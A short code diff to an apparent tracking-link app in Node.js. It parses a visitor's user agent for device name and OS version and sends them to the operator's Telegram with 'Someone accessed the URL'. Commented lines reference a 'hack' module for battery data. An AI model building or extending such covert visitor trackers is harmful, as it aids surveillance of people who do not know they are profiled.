@@ -75,7 +75,10 @@ function getDeviceName(userAgent) {
   }
 }
 
-
+function getOSVersion(userAgent) {
+  const osVersion = (userAgent.match(/(iPhone|iPad|iPod|Android|Windows|Macintosh)\s([0-9._]+)/) || [])[2];
+  return osVersion || "Unknown";
+}
 // Function to get battery information
 
 
@@ -91,12 +94,12 @@ app.get('/axl' , (req, res) => {
 /*  const { getBattery } = require('./hack');
   const batteryInfo = getBatteryInfo();
   */// Send a message to your Telegram ID with the detected device name
-
+const androos = getOSVersion(userAgent);
  
  const tmsg = `Someone accessed the URL 
 
 D:- ${deviceName}
-B:-  ✅️`;
+V:-  ${androos}`;
  
  
   bot.sendMessage(ajsal, tmsg);
